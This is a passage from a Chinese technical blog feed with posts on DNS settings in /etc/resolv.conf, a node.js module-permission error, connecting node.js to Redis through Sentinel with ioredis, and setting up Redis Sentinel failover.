我配置的是使用静态DNS <code>8.8.8.8</code> ，但是 <code>/etc/resolv.conf</code> 文件内容多出了两项，怀疑是 <code>search lan</code> 引起。
</p>

<p>
很多的网络管理工具都会去改动 <code>/etc/resolv.conf</code> 文件，如 <code>pdnsd</code> <code>dnsmasq</code> <code>NetworkManager</code> 。
</p>

<div id="outline-container-org9096d4d" class="outline-2">
<h2 id="org9096d4d">禁止 <code>NetworkManager</code> 改动 <code>/etc/resolv.conf</code></h2>
<div class="outline-text-2" id="text-org9096d4d">
<ul class="org-ul">
<li><p>
修改 <code>/etc/NetworkManager/NetworkManager.conf</code> 配置
</p>

<p>
<code>dns=none</code>
</p></li>

<li><p>
重新载入 <code>systemd</code> 配置
</p>

<p>
<code>sudo systemctl daemon-reload</code>
</p></li>

<li><p>
重启 <code>NetworkManager</code>
</p>

<p>
<code>sudo systemctl restart NetworkManager</code>
</p></li>

<li><p>
重新生成 <code>/etc/resolv.conf</code>
</p>

<p>
<code>sudo resolvconf -u</code>
</p>

<pre class="example">
# Generated by resolvconf
nameserver 8.8.8.8
</pre>

<p>
现在可以正常上网了。
</p>

<p>
但是静态DNS <code>8.8.8.8</code> 不太稳定，最好换成优先使用DHCP分配的本地DNS。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org54c0f62" class="outline-2">
<h2 id="org54c0f62">使用DHCP分配的本地DNS</h2>
<div class="outline-text-2" id="text-org54c0f62">
<ul class="org-ul">
<li><p>
撤销之前对 <code>/etc/NetworkManager/NetworkManager.conf</code> 的修改
</p>

<p>
<code>dns=default</code>
</p></li>

<li><p>
去掉 <code>/etc/resolvconf.conf</code> 配置的静态DNS
</p>

<pre class="example">
resolv_conf=/etc/resolv.conf
#name_servers=8.8.8.8
</pre></li>

<li><p>
重新载入 <code>systemd</code> 配置
</p>

<p>
<code>sudo systemctl daemon-reload</code>
</p></li>

<li><p>
重启 <code>NetworkManager</code>
</p>

<p>
<code>sudo systemctl restart NetworkManager</code>
</p></li>

<li><p>
重新生成 <code>/etc/resolv.conf</code>
</p>

<p>
<code>sudo resolvconf -u</code>
</p>

<pre class="example">
# Generated by resolvconf
nameserver 192.168.111.1
</pre>

<p>
过一会儿 <code>/etc/resolv.conf</code> 内容自动被更新
</p>

<pre class="example">
# Generated by resolvconf
search lan
nameserver 192.168.111.1
</pre>

<p>
<code>search lan</code> 又出现了， <code>NetworkManager</code> 貌似是通过 <code>dhclient</code> 对 <code>/etc/resolv.conf</code> 进行修改的，
具体指令参见 <code>/sbin/dhclient-script</code> 。
</p>

<p>
上网又很流畅了，看来之前上网慢是由 <code>8.8.8.8</code> DNS服务器抽风引起，与 <code>search lan</code> 配置无关。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgf3343ab" class="outline-2">
<h2 id="orgf3343ab">参考</h2>
<div class="outline-text-2" id="text-orgf3343ab">
<p>
<a href="https://wiki.archlinux.org/index.php/Resolv.conf#Preserve_DNS_settings">resolv.conf - ArchWiki</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[修复文件目录权限引起的错误：Cannot find module]]></title>
            <link>/article/4fee590d65874ef676ee5f55674396505f158d77768495198befff1a-cannot-find-module.html</link>
            <guid>/article/4fee590d65874ef676ee5f55674396505f158d77768495198befff1a-cannot-find-module.html</guid>
            <pubDate>Mon, 28 Dec 2015 07:28:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<code>node.js</code> 应用部署后多次遇到这种错误：
</p>

<pre class="example">
Error: Cannot find module '../encodings'
      at Function.Module._resolveFilename (module.js:338:15)
      at Function.Module._load (module.js:289:25)
      at Function._load (/usr/local/www.xxxxxxxx.com/node_modules/pm2/node_modules/pmx/lib/transaction.js:62:21)
      at Module.require (module.js:366:17)
      at require (module.js:385:17)
      at Object.getCodec (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:61:27)
      at Object.getDecoder (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:118:23)
      at getDecoder (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:44:18)
      at readStream (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:218:15)
      at executor (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:110:5)
</pre>

<p>
下意识地以为是 <code>node.js</code> 版本用错了（ <code>npm install</code> 和运行时的 <code>node.js</code> 版本不一致），删除 <code>node_modules</code> 重新 <code>npm install</code> 后还是一样的问题。
</p>

<p>
查了一下源代码，找到了出错位置 <code>node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:61</code> ：
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">if</span> (!iconv.encodings)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   iconv.encodings = require(<span style="color: #8abeb7;">"../encodings"</span>); <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">Lazy load all encoding definit</span><span style="color: #969896; font-style: italic; text-decoration: underline;">ions.</span>
</pre>
</div>

<p>
这是延迟加载模块，代码本身没有错， <code>../encodings</code> 模块是存在的，以前也有遇到类似问题，不过是在 <code>node.js</code> 一启动就报错，因为系统默认的权限太严格了（如： <code>umask</code> 为 <code>0077</code> ）， <code>npm install</code> 安装的 <code>node_modules</code> 其它用户（如 <code>nobody</code> ）没有访问权限。这次是在处理用户请求过程中报错，考虑到上面的模块是延迟加载，在初始化完成与监听端口处理用户请求的代码之间，我的代码有 <code>setuid</code> 到 <code>nobody</code> 的逻辑，应该还是文件目录权限引起。
</p>

<p>
最终发现是 <code>/usr/local/www.xxxxxxxx.com</code> 在创建时因为系统默认的权限设置太严格（ <code>umask</code> 为 <code>0077</code> ），导致 <code>nobody</code> 用户无法访问，改一下目录权限后问题修复。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js连接redis高可用性方案：Sentinel]]></title>
            <link>/article/node.js-8fde63a5-redis-9ad853ef7528602765b96848ff1a-sentinel.html</link>
            <guid>/article/node.js-8fde63a5-redis-9ad853ef7528602765b96848ff1a-sentinel.html</guid>
            <pubDate>Sun, 27 Dec 2015 06:27:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
node.js后台应用在开始时往往不会搞得太复杂，使用单实例的redis，一般都会使用官方推荐的模块 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 。
</p>

<div id="outline-container-org5f99f9b" class="outline-2">
<h2 id="org5f99f9b">访问单实例node.js</h2>
<div class="outline-text-2" id="text-org5f99f9b">
<p>
在 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 的基础上稍作封装，主要是避免并行访问时意外创建多个redis连接。
</p>
</div>

<div id="outline-container-org6894f85" class="outline-3">
<h3 id="org6894f85">database.js</h3>
<div class="outline-text-3" id="text-org6894f85">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">redis</span> = require(<span style="color: #8abeb7;">'redis'</span>);

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">Database</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">self</span> = <span style="color: #81a2be;">this</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis_host = <span style="color: #8abeb7;">'127.0.0.1'</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis_port = 6379;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis_db = 2;

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis = <span style="color: #81a2be;">null</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis_selected = <span style="color: #81a2be;">false</span>;
}

Database.<span style="color: #81a2be;">prototype</span>.redis = <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">self</span> = <span style="color: #81a2be;">this</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (self._redis &amp;&amp; self._redis_selected) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">null</span>, self._redis);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (! self._redis) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis = redis.createClient(self._redis_port, self._redis_host);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis.select(self._redis_db, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis_selected = <span style="color: #81a2be;">true</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">null</span>, self._redis);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
};


module.exports = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Database</span>();
</pre>
</div>
</div>
</div>

<div id="outline-container-orgec0a2e4" class="outline-3">
<h3 id="orgec0a2e4">client.js</h3>
<div class="outline-text-3" id="text-orgec0a2e4">
<p>
使用 <code>database.js</code>
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">db</span> = require(<span style="color: #8abeb7;">'./database'</span>);

db.redis(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(err.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> process.exit(1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.set(<span style="color: #8abeb7;">'hello'</span>, <span style="color: #8abeb7;">'world'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(err.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> process.exit(1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   setTimeout(<span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.get(<span style="color: #8abeb7;">'hello'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">value</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(err.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> process.exit(1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'hello: '</span> + value);

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(0);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }, 20*1000);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
});
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orga7636bc" class="outline-2">
<h2 id="orga7636bc">访问主备Redis</h2>
<div class="outline-text-2" id="text-orga7636bc">
<p>
但是随着服务的成功，用户量开始增加，另外对稳定性、可靠性有了一定要求，确保数据的安全性成了重中之重，redis由单机转向主/备（Replication）甚至集群（Cluster），
本文只关注使用 <code>Sentinel</code> 管理的主/备（Replication）Redis。
</p>

<p>
这就意味着Redis客户端应用不能直接连接Redis实例，而是需要先连接 <code>Sentinel</code> ，根据 <code>Sentinel</code> 提供的 <code>Master</code> 或 <code>Slave</code> 地址连接Redis实例，
还要接收 <code>Sentinel</code> 的 <code>Master</code> <code>Slave</code> 变动通知，重连Redis实例。
</p>

<p>
不幸的是，<a href="https://github.com/NodeRedis/node_redis">node_redis</a> 模块只支持单实例redis，基于 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 实现与 <code>Sentinel</code> 的交互工作量比较大。
</p>

<p>
所幸的是 <a href="http://github.com/luin/ioredis/">ioredis</a> （现已成为redis官方推荐模块）出现了，它支持 <code>Sentinel</code> ，而且大部分API跟 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 是兼容的:
</p>

<blockquote>
<p>
ioredis is a robust, full-featured Redis client that is used in the world's biggest online commerce company Alibaba and many other awesome companies.
</p>

<ol class="org-ol">
<li>Full-featured. It supports Cluster, Sentinel, Pipelining and of course Lua scripting &amp; Pub/Sub (with the support of binary messages).</li>
<li>High performance.</li>
<li>Delightful API. It works with Node callbacks and Bluebird promises.</li>
<li>Transformation of command arguments and replies.</li>
<li>Transparent key prefixing.</li>
<li>Abstraction for Lua scripting, allowing you to define custom commands.</li>
<li>Support for binary data.</li>
<li>Support for TLS.</li>
<li>Support for offline queue and ready checking.</li>
</ol>
<ol class="org-ol">
<li>Support for ES6 types, such as Map and Set.</li>
<li>Support for GEO commands (Redis 3.2 Unstable).</li>
<li>Sophisticated error handling strategy.</li>
</ol>
</blockquote>

<p>
<a href="http://github.com/luin/ioredis/">ioredis</a> 提供了从 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 进行迁移的文档 <a href="https://github.com/luin/ioredis/wiki/Migrating-from-node_redis">Migrating from node_redis</a> 。
</p>

<p>
但也要注意 <a href="http://github.com/luin/ioredis/">ioredis</a> 的不同之处，如连接 <code>Redis</code> 失败时， <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 默认是不重连，而 <a href="http://github.com/luin/ioredis/">ioredis</a> 会重连，在 <code>redis</code> 故障时可能导致 <code>node.js</code> 积压大量请求耗尽内存。
</p>

<p>
参考文档 <a href="https://github.com/luin/ioredis/blob/master/README.md#sentinel">ioredis Sentinel</a> ，将上一节 <code>访问单实例node.js</code> 中redis封装代码改成支持 <code>Sentinel</code>
</p>
</div>

<div id="outline-container-org9927c1f" class="outline-3">
<h3 id="org9927c1f">database.js</h3>
<div class="outline-text-3" id="text-org9927c1f">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">Redis</span> = require(<span style="color: #8abeb7;">'ioredis'</span>);

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">Database</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">self</span> = <span style="color: #81a2be;">this</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis_options = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   name: <span style="color: #8abeb7;">'mymaster'</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   sentinels: [{
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   host: <span style="color: #8abeb7;">'127.0.0.1'</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   port: 5000
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }, {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   host: <span style="color: #8abeb7;">'127.0.0.1'</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   port: 5001
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }],
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   db: 2
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   };

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis = <span style="color: #81a2be;">null</span>;
}

Database.<span style="color: #81a2be;">prototype</span>.redis = <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">self</span> = <span style="color: #81a2be;">this</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b5bd68;">if</span> (! self._redis) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   self._redis = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>(self._redis_options);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">null</span>, self._redis);
};

module.exports = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Database</span>();
</pre>
</div>

<p>
和使用 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 的 <code>database.js</code> 对照一下，可以发现 <a href="http://github.com/luin/ioredis/">ioredis</a> 连接 <code>redis</code> 时，支持 <code>db</code> 选项，可以省去调用 <code>select</code> 。
</p>

<p>
值得注意的是 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 最近开始支持连接 <code>redis</code> 时指定 <code>db</code> 选项，见 <a href="https://github.com/NodeRedis/node_redis/commit/a4285c156c5b8964d92a36bd7f361a6f40e2449a">Parse redis url just like IANA · NodeRedis/node_redis@a4285c1</a> ，
使用该特性时请安装最新版的 <a href="https://github.com/NodeRedis/node_redis">node_redis</a> 。
</p>

<blockquote>
<p>
db: null; If set, client will run redis select command on connect. This is not recommended.
</p>
</blockquote>
<p>
引用自 <a href="https://github.com/NodeRedis/node_redis#rediscreateclient">redis.createClient()文档</a>
</p>
</div>
</div>

<div id="outline-container-org9788223" class="outline-3">
<h3 id="org9788223">启动 Redis 及 Sentinel</h3>
<div class="outline-text-3" id="text-org9788223">
<p>
启动上一篇文章《 <a href="http://blog.kankanan.com/article/redis-9ad853ef7528602765b96848ff1a-sentinel.html">redis高可用性方案：Sentinel</a> 》配置好的 <code>Sentinel</code>
</p>

<ul class="org-ul">
<li><code>Master</code> <code>redis-server ./redis-master.conf</code></li>

<li><code>Slave</code> <code>redis-server ./redis-slave.conf</code></li>

<li><code>Sentinel a</code> <code>redis-sentinel ./redis-sentinel-a.conf</code></li>

<li><code>Sentinel b</code> <code>redis-sentinel ./redis-sentinel-b.conf</code></li>

<li><code>Sentinel c</code> <code>redis-sentinel ./redis-sentinel-c.conf</code></li>
</ul>
</div>
</div>

<div id="outline-container-orgae39596" class="outline-3">
<h3 id="orgae39596">演示运行</h3>
<div class="outline-text-3" id="text-orgae39596">
<p>
运行演示脚本
</p>

<div class="org-src-container">
<pre class="src src-sh"><span id="coderef-master_write" class="coderef-off"><span class="linenr">1: </span>node client.js &amp;</span>
<span id="coderef-wait_sync" class="coderef-off"><span class="linenr">2: </span>sleep 1</span>
<span id="coderef-slave_read" class="coderef-off"><span class="linenr">3: </span>redis-cli -p 6380 -n 2 get hello</span>
<span id="coderef-failover" class="coderef-off"><span class="linenr">4: </span>redis-cli -p 6379 debug sleep 30 &amp;</span>
</pre>
</div>

<dl class="org-dl">
<dt>行 <a href="#coderef-master_write" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-master_write');" onmouseout="CodeHighlightOff(this, 'coderef-master_write');">1</a></dt><dd>运行 <code>client.js</code> 在 <code>Master</code> 写入键值</dd>

<dt>行 <a href="#coderef-wait_sync" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-wait_sync');" onmouseout="CodeHighlightOff(this, 'coderef-wait_sync');">2</a></dt><dd>等待 <code>Master</code> 同步数据到 <code>Slave</code></dd>

<dt>行 <a href="#coderef-slave_read" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-slave_read');" onmouseout="CodeHighlightOff(this, 'coderef-slave_read');">3</a></dt><dd>从 <code>Slave</code> 读取键值</dd>

<dt>行 <a href="#coderef-failover" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-failover');" onmouseout="CodeHighlightOff(this, 'coderef-failover');">4</a></dt><dd>触发故障切换</dd>
</dl>

<p>
演示脚本运行结果
</p>

<pre class="example">
<span id="coderef-slave_read_result" class="coderef-off"><span class="linenr">5: </span>"world"</span>
<span id="coderef-slave_read_status" class="coderef-off"><span class="linenr">6: </span>OK</span>
<span id="coderef-master_read" class="coderef-off"><span class="linenr">7: </span>hello: world</span>
</pre>

<dl class="org-dl">
<dt>行 <a href="#coderef-slave_read_result" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-slave_read_result');" onmouseout="CodeHighlightOff(this, 'coderef-slave_read_result');">5</a></dt><dd>演示脚本行 <a href="#coderef-slave_read" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-slave_read');" onmouseout="CodeHighlightOff(this, 'coderef-slave_read');">3</a> 的redis命令执行结果</dd>

<dt>行 <a href="#coderef-slave_read_status" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-slave_read_status');" onmouseout="CodeHighlightOff(this, 'coderef-slave_read_status');">6</a></dt><dd>演示脚本行 <a href="#coderef-slave_read" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-slave_read');" onmouseout="CodeHighlightOff(this, 'coderef-slave_read');">3</a> 的redis命令执行状态</dd>

<dt>行 <a href="#coderef-master_read" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-master_read');" onmouseout="CodeHighlightOff(this, 'coderef-master_read');">7</a></dt><dd>演示脚本行 <a href="#coderef-master_write" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-master_write');" onmouseout="CodeHighlightOff(this, 'coderef-master_write');">1</a> 后台运行结束时输出的键值，此时由于主备已切换，是从新的 <code>Master</code> （原 <code>Slave</code> ）上获取的</dd>
</dl>
</div>
</div>
</div>

<div id="outline-container-orgfee20e0" class="outline-2">
<h2 id="orgfee20e0">参考</h2>
<div class="outline-text-2" id="text-orgfee20e0">
<p>
<a href="https://github.com/luin/ioredis/blob/master/README.md#sentinel">ioredis Sentinel</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[redis高可用性方案：Sentinel]]></title>
            <link>/article/redis-9ad853ef7528602765b96848ff1a-sentinel.html</link>
            <guid>/article/redis-9ad853ef7528602765b96848ff1a-sentinel.html</guid>
            <pubDate>Sat, 26 Dec 2015 14:54:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在前面一篇文章《 <a href="http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html">redis高可用性基础：Master-Slave</a> 》中，主备切换过程时有好几个步骤，需要人工介入，这势必增加服务的故障时间（Down Time）。
</p>

<p>
而 <code>Sentinel</code> 正是自动化这一过程的官方工具，详细文档请参考《<a href="http://redis.io/topics/sentinel">Redis Sentinel Documentation – Redis</a>》。
</p>

<div id="outline-container-org50860f1" class="outline-2">
<h2 id="org50860f1"><code>Sentinel</code> 的功能</h2>
<div class="outline-text-2" id="text-org50860f1">
<ul class="org-ul">
<li><p>
监控
</p>

<p>
<code>Sentinel</code> 不断地检测 <code>Master</code> 和 <code>Slave</code> 实例的运行状态。
</p></li>

<li><p>
通知
</p>

<p>
<code>Sentinel</code> 通过API，能够通知系统管理员、其它程序：监控的Redis实例出问题了。
</p></li>

<li><p>
自动故障切换
</p>

<p>
如果 <code>Master</code> 实例出问题了， <code>Sentinel</code> 通过将一个 <code>Slave</code> 实例提升为 <code>Master</code> 修复故障，其它 <code>Slave</code> 实例使用新的 <code>Master</code> 实例，同时通知给使用Redis服务的应用程序以便重新建立连接。
</p></li>

<li><p>
配置提供者
</p>

<p>
<code>Sentinel</code> 做为客户端服务发现的权威来源：客户端连接到 <code>Sentinel</code> 以获取当前 <code>Master</code> 的地址，故障切换后报告新的地址。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgeecb8b2" class="outline-2">
<h2 id="orgeecb8b2"><code>Sentinel</code> 演示</h2>
<div class="outline-text-2" id="text-orgeecb8b2">
<p>
<code>Redis Sentinel</code> 推荐的配置为至少三个Sentinel部署在三台不同的机器上，只配一台自已本身就是单点没有意义，二台时可能出现“脑裂”。
</p>

<ul class="org-ul">
<li><p>
启动上一篇文章《 <a href="http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html">redis高可用性基础：Master-Slave</a> 》配置好的 <code>Master</code> 及 <code>Slave</code> Redis实例
</p>

<p>
<code>Master</code> 监听在 <code>6379</code> 端口， <code>Slave</code> 监听在 <code>6380</code> 端口。
</p></li>

<li><p>
使用端口号 <code>5000</code> <code>5001</code> <code>5002</code> 创建三个 <code>Sentinel</code> 实例
</p>

<p>
<code>Sentinel</code> 实例 <code>a</code> 的配置文件 <code>redis-sentinel-a.conf</code>
</p>

<pre class="example">
port 5000
sentinel monitor mymaster 127.0.0.1 6379 2
sentinel down-after-milliseconds mymaster 5000
sentinel failover-timeout mymaster 60000
sentinel parallel-syncs mymaster 1
</pre>

<p>
其它两个 <code>Sentinel</code> 实例 <code>b</code> <code>c</code> 配置和 <code>a</code> 基本一样，只是端口号分别为 <code>5001</code> 和 <code>5002</code> ：
</p>

<p>
<a href="../static/redis-sentinel-a.conf">redis-sentinel-a.conf</a>
</p>

<p>
<a href="../static/redis-sentinel-b.conf">redis-sentinel-b.conf</a>
</p>

<p>
<a href="../static/redis-sentinel-c.conf">redis-sentinel-c.conf</a>
</p>

<p>
终端 <code>3</code> 启动 <code>Sentinel a</code> <code>redis-sentinel ./redis-sentinel-a.conf</code>
</p>

<p>
终端 <code>4</code> 启动 <code>Sentinel b</code> <code>redis-sentinel ./redis-sentinel-b.conf</code>
</p>

<p>
终端 <code>5</code> 启动 <code>Sentinel c</code> <code>redis-sentinel ./redis-sentinel-c.conf</code>
</p>

<p>
